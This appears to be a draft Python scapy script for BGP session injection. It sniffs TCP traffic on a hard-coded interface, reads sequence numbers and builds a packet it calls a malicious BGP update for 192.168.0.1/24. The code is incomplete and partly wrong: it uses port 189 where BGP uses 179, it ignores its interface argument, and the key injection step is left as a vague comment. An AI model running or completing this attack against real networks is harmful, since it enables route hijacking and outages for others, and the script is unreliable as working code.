import sys
from scapy.all import *
from BGP_crafter import craft_BGP_update

BGP_PORT = 189 #Set to another port e.g. 443 (https) if you want to test it with other types of packets

def packet_callback(captured_packet):
    if captured_packet[TCP].sport == BGP_PORT or captured_packet[TCP].dport == BGP_PORT:
        print(f"Sequence number: {captured_packet[TCP].seq}")

        malicious_bgp_packet = craft_BGP_update("192.168.0.1/24", path=[], local_pref=0)
        malicious_bgp_packet.show()
        # Then, set sequence number of the malicious packet to seq number of the captured packet:
        #   malicious_bgp_packet[TCP] = captured_packet[TCP].seq (something like that)

def main(argv):
    if len(argv) != 2:
        print(f"Usage: {argv[0]} <interface_name>")
        sys.exit(-1)
    
    sniff(iface="Realtek PCIe GBE Family Controller", prn=packet_callback, filter="tcp", store=0)

if __name__ == "__main__":
  main(sys.argv)